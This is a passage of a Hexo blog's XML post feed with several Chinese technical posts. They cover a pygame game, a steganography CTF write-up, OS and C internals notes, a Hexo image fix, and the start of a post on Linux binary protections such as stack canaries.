class="params">self</span>):</span></span><br><span class="line">        screen_rect = self.screen.get_rect()</span><br><span class="line">        <span class="keyword">for</span> alien <span class="keyword">in</span> self.aliens.sprites():</span><br><span class="line">            <span class="keyword">if</span> alien.rect.bottom &gt;= screen_rect.bottom:</span><br><span class="line">                <span class="comment"># Treat this the same as if the ship got hit.</span></span><br><span class="line">                self._ship_hit()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;被外星人击中&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_ship_hit</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.stats.ships_left &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># 减少生命，并更新记分板.</span></span><br><span class="line">            self.stats.ships_left -= <span class="number">1</span></span><br><span class="line">            self.sb.prep_ships()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 摆脱任何剩余的外星人和子弹.</span></span><br><span class="line">            self.aliens.empty()</span><br><span class="line">            self.bullets.empty()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 建立一个新的舰队并集中舰船.</span></span><br><span class="line">            self._create_fleet()</span><br><span class="line">            self.ship.center_ship()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 暂停</span></span><br><span class="line">            sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.stats.game_active = <span class="literal">False</span></span><br><span class="line">            pygame.mouse.set_visible(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;建立外星人的舰队&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_create_fleet</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="comment"># 创建一个外星人并连续查找外星人的数量。</span></span><br><span class="line">        <span class="comment"># 每个外星人之间的间距等于一个外星人的宽度。</span></span><br><span class="line">        alien = Alien(self)</span><br><span class="line">        alien_width, alien_height = alien.rect.size</span><br><span class="line">        available_space_x = self.settings.screen_width - (<span class="number">2</span> * alien_width)</span><br><span class="line">        number_aliens_x = available_space_x // (<span class="number">2</span> * alien_width)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 确定适合屏幕的外星人行数</span></span><br><span class="line">        ship_height = self.ship.rect.height</span><br><span class="line">        available_space_y = (self.settings.screen_height -</span><br><span class="line">                                (<span class="number">3</span> * alien_height) - ship_height)</span><br><span class="line">        number_rows = available_space_y // (<span class="number">2</span> * alien_height)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 建立完整的外星人舰队.</span></span><br><span class="line">        <span class="keyword">for</span> row_number <span class="keyword">in</span> <span class="built_in">range</span>(number_rows):</span><br><span class="line">            <span class="keyword">for</span> alien_number <span class="keyword">in</span> <span class="built_in">range</span>(number_aliens_x):</span><br><span class="line">                self._create_alien(alien_number, row_number)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;创建外星人并将其放置在行中&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_create_alien</span>(<span class="params">self, alien_number, row_number</span>):</span></span><br><span class="line">        alien = Alien(self)</span><br><span class="line">        alien_width, alien_height = alien.rect.size</span><br><span class="line">        alien.x = alien_width + <span class="number">2</span> * alien_width * alien_number</span><br><span class="line">        alien.rect.x = alien.x</span><br><span class="line">        alien.rect.y = alien.rect.height + <span class="number">2</span> * alien.rect.height * row_number</span><br><span class="line">        self.aliens.add(alien)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;如果有任何外星人到达边缘，请做出适当的反应&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_fleet_edges</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> alien <span class="keyword">in</span> self.aliens.sprites():</span><br><span class="line">            <span class="keyword">if</span> alien.check_edges():</span><br><span class="line">                self._change_fleet_direction()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_change_fleet_direction</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;放下整个舰队并更改舰队的方向.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> alien <span class="keyword">in</span> self.aliens.sprites():</span><br><span class="line">            alien.rect.y += self.settings.fleet_drop_speed</span><br><span class="line">        self.settings.fleet_direction *= -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;更新屏幕上的图像，然后切换到新屏幕&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_screen</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Update images on the screen, and flip to the new screen.&quot;&quot;&quot;</span></span><br><span class="line">        self.screen.fill(self.settings.bg_color)</span><br><span class="line">        self.ship.blitme()</span><br><span class="line">        <span class="keyword">for</span> bullet <span class="keyword">in</span> self.bullets.sprites():</span><br><span class="line">            bullet.draw_bullet()</span><br><span class="line">        self.aliens.draw(self.screen)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 绘制分数信息.</span></span><br><span class="line">        self.sb.show_score()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#如果游戏处于非活动状态，请绘制播放按钮.</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.stats.game_active:</span><br><span class="line">            self.play_button.draw_button()</span><br><span class="line"></span><br><span class="line">        pygame.display.flip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 运行游戏</span></span><br><span class="line">    ai = AlienInvasion()</span><br><span class="line">    ai.run_game()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在设计时是需要不断对每个模块进行重构，重构的目的一是为了使代码看起来更简洁，而是优化代码，减少不必要的代码。除此之外，还需要对项目进行不断检查，检查是否有bug，对bug要进行即使修改。还有，python虽然使用起来非常方便，但是需要记住的函数却很多，要熟练的使用，必须要能够熟悉相关的第三方库，这样才能做到游刃有余。</p>]]></content>
      
      
      <categories>
          
          <category> 心得 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝帽杯MISC</title>
      <link href="/post/%E8%93%9D%E5%B8%BD%E6%9D%AFMISC.html"/>
      <url>/post/%E8%93%9D%E5%B8%BD%E6%9D%AFMISC.html</url>
      
        <content type="html"><![CDATA[<h1 id="冰墩墩"><a href="#冰墩墩" class="headerlink" title="冰墩墩"></a>冰墩墩</h1><p>拿到附件拖进虚拟机中使用binwalk查看</p><p><img src="https://i.loli.net/2021/05/05/Fpan5DGMyYfHrZx.png" alt="图片1.png"></p><p>发现里面存在rar压缩包，使用foremost进行分离</p><p><img src="https://i.loli.net/2021/05/05/v8i7wY6kUMNRXxA.png" alt="图片2.png"></p><p><img src="https://i.loli.net/2021/05/05/WgwaT4hGJ9FlHYU.png" alt="图片3.png"></p><p>发现音频和提示<img src="https://i.loli.net/2021/05/05/hxJzEVyRfQGDrFo.png" alt="图片4.png"></p><p>将音频放进010，在结尾发现cipher<img src="https://i.loli.net/2021/05/06/ubNWz2AeCUgl7X8.png" alt="图片5.png"></p><p>将对应的十六进制码复制下来，搜索以0~F编码的加密方式，发现是url编码。<img src="https://i.loli.net/2021/05/05/Aj62JcfVHiRQXdl.png" alt="图片6.png"></p><p>对十六进制码进行处理<img src="https://i.loli.net/2021/05/05/IV5ekvFXmoO4R2d.png" alt="图片7.png"></p><p>解码后发现是一堆表情包<img src="https://i.loli.net/2021/05/05/MxWecuYztbjRVHk.png" alt="图片9.png"></p><p>对表情包进行解码发现无法翻译，搜索了一下发现可能是emoji-aes加密，但缺少密匙，之后回去在看mp3文件，想到misc里面有一个MP3stego的工具，但是还需要一个密码才有行，想到之前的eight numbers，加上题目名称，猜测可能是冬奥会举办日期20220204<img src="https://i.loli.net/2021/05/06/Ru2JVmP3pL4vnIl.png" alt="图片11.png"></p><p>得到一个txt文件，发现是python里面的一种编码方式<img src="https://i.loli.net/2021/05/06/zK19G53w4ZsJfBQ.png" alt="图片13.png"></p><p>发现是wingdings图标，在线解码，得到密匙How_6ad_c0uld_a_1cePeak_be?   之后进行emoji-aes解码得到flag<img src="https://i.loli.net/2021/05/06/Yeg6xybJDlq4GrQ.png" alt="图片15.png"></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员的自我修养</title>
      <link href="/post/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB.html"/>
      <url>/post/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB.html</url>
      
        <content type="html"><![CDATA[<h1 id="分段"><a href="#分段" class="headerlink" title="分段"></a>分段</h1><p>基本思路使把一段与程序所需的内存空间大小的虚拟空间映射到某个地址空间。采用分段的方法可以解决以下几个问题</p><ul><li><p>地址空间不隔离。如果不同程序间地址连续很容易被恶意程序通过溢出手段使其它程序崩溃或者产生严重后果，而分段可以避免这种情况，比如此时有A,B两个程序，此时操作系统会分配两个虚拟地址，初始地址都是0x00000000，终止地址为程序的大小，一旦该程序访问超过了这个虚拟地址空间，操作系统就会抛出拒绝访问，如果正常访问，操作系统就会将虚拟地址映射到空闲物理地址中。</p><p><img src="https://i.loli.net/2021/05/05/xBaXR7tqjJcbWpl.png" alt="image-20210502230422504.png"></p></li><li><p>解决运行地址不确定。每次程序装载运行时，操作系统为其分配的空闲地址是不确定的，比如这次是0x00000000 ~ 0x00A00000，下一次可能就是0x00200000 ~ 0x00C00000，但是采用分段的方法，在虚拟内存中程序起始地址和终止地址不会发生改变，很好的解决了解决运行地址不确定这一问题。</p></li><li><p>对不同的段设置不同的权限。比如数据段就不会有执行权限，只读段只有读取的权限，有效的防止了溢出攻击，加大程序被攻破的难度</p></li><li><p>适应CPU的缓存体系。CPU缓存体系被分为数据缓存和指令缓存，采用分段的方法极大地提高了缓存的命中率。</p></li><li><p>有利于共享空间，节约内存。比如系统在运行某一个程序时，可能出现多个该程序的多个副本，这些副本代码是一样的且只可读，所以可以采取共享一个段的方法来节约内存。</p><p>当然，分段并不是完美无缺的，当内存不够时，操作系统会将一些在内存中进程存进磁盘，采用分段的方法，由于映射的单位是程序，所以换入换出的是整个程序，粒度较大，严重影响了运行速度</p></li></ul><h1 id="不要让CPU打盹"><a href="#不要让CPU打盹" class="headerlink" title="不要让CPU打盹"></a>不要让CPU打盹</h1><p>CPU的价值巨大，为了充分利用CPU，早期采用<strong>多道程序</strong>的方法利用CPU，就是当某个程序不再需要CPU时，监控程序就会将需要CPU的程序自动开启，虽然提高CPU利用率，但是不能很好满足用户需求，比如用户要启动一个程序，可能要等待上一个程序上一个程序完成才行，这是极为致命，所以改进为<strong>分时系统</strong>，分时系统能够较好的改良这个问题，如果有个程序在使用CPU，但此时用户要启动另一个程序，系统就会暂停这个程序，去完成用户指定的程序，但这个办法缺点是，如果有个程序霸占CPU，那么即使用户要启动另一个程序依旧要等待，因为所有的优先级是一样的，为了解决这个问题，改进为如今的<strong>多任务系统</strong>，这个系统中操作系统有了最高权限，接管了所有的硬件资源，且受硬件保护，应用程序都是以<strong>进程</strong>的运行，它们的权限会比操作系统低，同时，每个进程都会有<strong>独立的地址空间</strong>，让进程相互分开。不仅如此，每个进程都有有个优先级，能够有序的运行，万一优先级较高的进程霸占了CPU，操作系统就会“出手”暂停这个进程将CPU分给下一个进程，也就是所谓的<strong>抢占式</strong>。</p><h1 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h1><p><strong>进程（Process）</strong>是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。<strong>线程</strong>被称为<strong>轻量级进程</strong>是程序执行流的最小单元，由线程ID，当前指令指针，寄存器集合和堆栈组成。线程可以访问进程内存里面所有数据，甚至包括其他线程等等堆栈(要知道其他线程堆栈的地址，很少见的情况)，当然线程也有私有内存空间，如栈(并非完全私有)，线程局部存储，寄存器。而在Linux下没有线程与进程的概念，但是有类似作用的<strong>任务</strong>，任务相当于线程，但是任务之间可以选择共享内存空间，这些任务组合起来就相当于Windows下的进程。</p><h1 id="线程同步"><a href="#线程同步" class="headerlink" title="线程同步"></a>线程同步</h1><h2 id="二元信号量"><a href="#二元信号量" class="headerlink" title="二元信号量"></a><strong>二元信号量</strong></h2><p>　　是最简单的一种锁，适合只能被唯一一个线程独占访问的资源；对于允许多个线程并发访问的资源，多元信号量简称信号量；</p><h2 id="互斥量"><a href="#互斥量" class="headerlink" title="互斥量"></a><strong>互斥量</strong></h2><p>　　和二元信号量很类似，资源仅同时允许一个线程访问，但和信号量不同的是，信号量在整个系统可以被任意线程获取并释放；也就是说哪个线程锁的，要哪个线程解锁。</p><h2 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a><strong>临界区</strong></h2><p>　　是比互斥量更加严格的同步手段。在术语中，把临界区的获取称为进入临界区，而把锁的释放称为离开临界区。与互斥量和信号量的区别：</p><p>　　(1)互斥量和信号量字系统的任何进程都是可见的。</p><p>　　(2)临界区的作用范围仅限于本进程，其他进程无法获取该锁。</p>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序员的自我修养 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言函数调用与常见调用约定</title>
      <link href="/post/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%8E%E5%B8%B8%E8%A7%81%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A.html"/>
      <url>/post/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%8E%E5%B8%B8%E8%A7%81%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A.html</url>
      
        <content type="html"><![CDATA[<h1 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h1><p>下面代码展示了一个简单的加法子函数调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">plus</span> <span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c;</span><br><span class="line">    c=plus(a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入反汇编查看</p><p><img src="https://i.loli.net/2021/05/05/WinHfG98h6gNzVs.png" alt="image-20210425221051251.png"></p><p>首先，系统会将1，2分别移动到a，b对应的地址中，之后从右至左将b，a对应地址的值移动到eax，ecx中，之后进行跳转到plus函数的plt表</p><p><img src="https://i.loli.net/2021/05/05/fkHsWxKLNU9uXBb.png" alt="image-20210425221706739.png"></p><p>再跳转到plus函数的实际中</p><p><img src="https://i.loli.net/2021/05/05/K1Qb8IYfksJ6lUd.png" alt="image-20210425221830540.png"></p><p>子函数先是把ebp保存在栈中，之后通过mov指令将ebp指向esp指向的位置，esp再进行抬栈处理，然后保存现场（将ebx，esi，edi存储的值保存在堆栈中）,接下来把ebp-0ch对应的地址移动到edi中。之后向ecx赋30h，向eax赋0CCCCCCCCh，然后对es:edi对应的地址开始循环赋值（整个过程就是对缓冲区初始化）。（后面两个不知道是什么，太菜了😅）</p><p>补：缓冲区用于存储函数调用里面申请的变量，因为这些变量存放在缓冲区，当调用完成后缓冲区会被丢弃，所以函数调用里面的变量无法被函数外面访问到</p><p><img src="https://i.loli.net/2021/05/05/A2XJYcVMrRgTzaP.png" alt="image-20210426075548516.png"></p><p>接下来就是将a的值移动到eax中再加b的值，后面再恢复现场，再内平栈（add esp 0C0h）,之后比较esp，ebp是否相同，（如果相同我也不知道会怎么样，😅），然后将esp指向ebp指向的位置，将ebp返回到原来的地方。</p><p><img src="https://i.loli.net/2021/05/05/Cc6jF9qiHUAKoG7.png" alt="image-20210425222327010.png"></p><p>最后外平栈（add esp,8），将计算结果从eax移到变量c对应的地址中，至此完成函数调用</p><p><img src="https://i.loli.net/2021/05/05/CAj5SFWvYikT38l.png" alt="image-20210426075951991.png"></p><h1 id="常见的三种调用约定（32位）"><a href="#常见的三种调用约定（32位）" class="headerlink" title="常见的三种调用约定（32位）"></a>常见的三种调用约定（32位）</h1><p><img src="https://i.loli.net/2021/05/05/vaOVrxQuMnZfL4F.png" alt="image-20210426080234751.png"></p><p>第一种就是系统默认的调用约定，调用者清理栈，就是和上面外平栈（add esp,8）差不多</p><p>第二种就是在返回时对ret进行处理，使栈指针指向调用参数前的地址（如：ret 8）</p><p>第三种就是通过寄存器传参，但如果寄存器不够还是得借助栈来传参，因为cpu与寄存器之间传递相对于cpu与内存更快，所以第三种方法在参数较少时，更加高效。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收获 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>switch语句高效的原因</title>
      <link href="/post/switch%E8%AF%AD%E5%8F%A5%E9%AB%98%E6%95%88%E7%9A%84%E5%8E%9F%E5%9B%A0.html"/>
      <url>/post/switch%E8%AF%AD%E5%8F%A5%E9%AB%98%E6%95%88%E7%9A%84%E5%8E%9F%E5%9B%A0.html</url>
      
        <content type="html"><![CDATA[<p>switch语句和if语句都是条件判断语句，但是switch语句更加高效，因而许多公司在设计时大多采用switch语句</p><ul><li><p>当分支语句较少时，switch与if语句并没有什么区别都是先判断，之后再跳转</p><p><img src="https://i.loli.net/2021/05/05/JbqGPogxXlWz5Cy.png" alt="image-20210424220833029_1_.png"></p><p><img src="https://i.loli.net/2021/05/05/4PwV6MvuABhcRUG.png" alt="image-20210424221716230.png"></p></li><li><p>当分支较多时，switch语句就发生变化，并没有挨个判断再跳转，只跳转了一次</p><p><img src="https://i.loli.net/2021/05/05/ernR2PoyQKiG5Xp.png" alt="image-20210424220610926.png"></p><p><img src="https://i.loli.net/2021/05/05/75EbrqeRQwoDhI3.png" alt="image-20210425073459041.png"></p></li></ul><p>switch语句会维护一张跳转表，不管case判断语句的值是不是按照顺序的，内存中的地址表都会按照顺序进行排列。分析汇编代码会发现，编译器先是将x的值赋给ecx寄存器，之后ecx减去case中最小值并与case中最大值比较，大于就会跳转到default，不大于就会将ecx寄存器中的值移到edx中,之后跳转到edx * 4+14191Ch对应的地址，查看地址发现ABCD四个字符存放的位置就是相差4个字节。所以，当分支较多时，switch-case不用像if-else if那样遍历条件分支直到命中条件，而只需访问对应索引号的表项从而到达定位到分支。<strong>从数据结构与算法的角度来看，switch 语句相当于一个数组，其查询时间复杂度为 O(1)；而 if-lese 语句相当于一个链表，其时间复杂度为 O(n)</strong></p><p><img src="https://i.loli.net/2021/05/05/IskPjxBeu4i2RcF.png" alt="image-20210425073053511.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>使用switch语句时，程序首先判断switch变量是否大于（小于）最大（最小）case 常量，若大于（小于），则跳到default分支处理；否则取得索引号为switch变量大小的跳表项的地址（即跳表的起始地址＋表项大小＊索引号），程序接着跳到此地址执行，到此完成了分支的跳转。。即使case情况不连续或者case情况相差较大时，也能达到相应的效果。</p><p><img src="https://img-blog.csdnimg.cn/20191208162619834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3pidzExODU=,size_16,color_FFFFFF,t_70"></p><p>参考文章：<a href="https://blog.csdn.net/zbw1185/article/details/103359426">https://blog.csdn.net/zbw1185/article/details/103359426</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收获 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从源文件到可执行文件</title>
      <link href="/post/%E4%BB%8E%E6%BA%90%E6%96%87%E4%BB%B6%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.html"/>
      <url>/post/%E4%BB%8E%E6%BA%90%E6%96%87%E4%BB%B6%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.html</url>
      
        <content type="html"><![CDATA[<h1 id="从源文件到可执行文件"><a href="#从源文件到可执行文件" class="headerlink" title="从源文件到可执行文件"></a>从源文件到可执行文件</h1><p>C源文件到可执行文件共经历了4个过程，包括<strong>预处理、编译、汇编、链接</strong>。这里在Linux环境下展示此过程，源代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> hello <span class="meta-string">&quot;Hello World&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(hello);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h1><p>在这个阶段，编译器会做以下事情：</p><ul><li>将所有的#define删除，并将宏定义展开。</li><li>处理一些条件预编译指令如#ifndef,#ifdef,#elif,#else,#endif等。将不必要的代码过滤掉。</li><li>处理#include预编译指令，将被包含的文件插入到该预编译指令的位置。这个过程是递归进行的，因为被包含的文件可能也包含其他文件。</li><li>预处理过程还会过滤掉所有注释/**/和//里面的内容。</li><li>另外还会添加行号和文件名标识。</li><li>最后会保留#pragma编译器指令，因为编译器需要使用它们。</li></ul><p>补充：#include&lt;&gt; ，<strong>从标准库中寻找头文件，</strong>#include””，<strong>从当前目录开始寻找头文件。</strong><br>查看预处理后的文件<br><img src="https://i.loli.net/2021/05/14/p4kwEuFWPHXhiqm.png" alt="image.png"><br>在.i文件中#include&lt;stdio.h&gt;展开，输出里面的宏定义hello也被替换成Hello World<img src="https://i.loli.net/2021/05/14/EQFnMI2eHVqJ4Ni.png" alt="image.png"></p><h1 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h1><p>编译阶段，C语言每条语句都以一种标准的文件格式确切地描述了一条低级机器语言指令<br>生成编译后的文件</p><p><img src="https://i.loli.net/2021/05/14/P4VehmoKyF1Sp2k.png" alt="image.png"></p><p>可以看到C语言文件被翻译成汇编代码，每条语句都以一种标准的文件格式确切地描述了一条低级机器语言指令<img src="https://i.loli.net/2021/05/14/bwRGcPMFemIo35T.png" alt="image.png"></p><h1 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h1><p>汇编阶段，编译器将hello.s翻译成机器语言指令, 把这些指令打包成一种可重定位目标程序的格式, 并把结果保存在hello.o中, hello.o是一个二进制文件, 它的字节编码是机器语言指令, 而不是字符<br>通过以下指令查看汇编后的文件<br><img src="https://i.loli.net/2021/05/14/MSoJZqPhRXCVfc7.png" alt="image.png"></p><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>在这个阶段，编译器会将含有调用函数的目标文件以某种方式合并起来生成可以执行文件（比如printf函数的目标文件就在printf.o），命令：gcc hello.o -o hello</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收获 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决hexo博客图片无法加载问题</title>
      <link href="/post/%E8%A7%A3%E5%86%B3hexo%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98.html"/>
      <url>/post/%E8%A7%A3%E5%86%B3hexo%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E6%97%A0%E6%B3%95%E5%8A%A0%E8%BD%BD%E9%97%AE%E9%A2%98.html</url>
      
        <content type="html"><![CDATA[<p>起初搭建好博客时，发现照片无法上传本地照片，</p><p><img src="https://i.loli.net/2021/05/05/eqIWLvuprdglSfw.png" alt="image-20210420170617857.png"></p><p>根据网上的方法整了半天也没整好，最后还是室友告诉我通过下面的方法才可以引用本地照片</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;path&quot; height&#x3D;&quot;xxx&quot; width&#x3D;&quot;xxx&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure><p>但是用这个方法需要在source目录下创建一个目录来存储照片，后面写多了博客，发现这样会特别杂乱，而且最最重要的是虽然能在博客上显示，但是不能在本地显示，操作起来非常不方便。</p><p><img src="https://i.loli.net/2021/05/05/3Wb1FxCKzS79j8I.png" alt="image-20210420171012258.png"></p><p>于是在网上找了半天，各种方法都是了一遍终于发现解决办法</p><p><a href="https://www.bilibili.com/video/BV1D7411U7Yk?p=1&share_medium=android&share_plat=android&share_source=QQ&share_tag=s_i&timestamp=1618877916&unique_k=WC367T">参考链接</a></p><p>首先下载插件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add https:&#x2F;&#x2F;github.com&#x2F;CodeFalling&#x2F;hexo-asset-image</span><br></pre></td></tr></table></figure><p>之后修改博客根目录文件_config.yml中的 <code>post_asset_folder: false</code>，将其改成<code>post_asset_folder: true</code>（注意冒号后面有个空格）,然后就可以通过markdown语法正常上传照片了</p><p>这个方法不仅支持使用markdown语法，而且写博客会创建一个同名文件夹来存放照片，非常方便，而且最重要的是可以在本地预览</p>]]></content>
      
      
      <categories>
          
          <category> 问题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常见的保护机制</title>
      <link href="/post/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E2%BD%A4%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.html"/>
      <url>/post/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E2%BD%A4%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.html</url>
      
        <content type="html"><![CDATA[<h1 id="checksec（gdb安装好就有）"><a href="#checksec（gdb安装好就有）" class="headerlink" title="checksec（gdb安装好就有）"></a>checksec（gdb安装好就有）</h1><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>动态调试软件，必备。</p><p>安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gdb</span><br></pre></td></tr></table></figure><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>作用：它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p><p>用法：checksec filename</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec start</span><br><span class="line">CANARY    : disabled(这个选项表示栈保护功能有没有开启。)</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure><h1 id="CANNARY-栈保护"><a href="#CANNARY-栈保护" class="headerlink" title="CANNARY(栈保护)"></a>CANNARY(栈保护)</h1><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈中高危区插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。**</p><p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 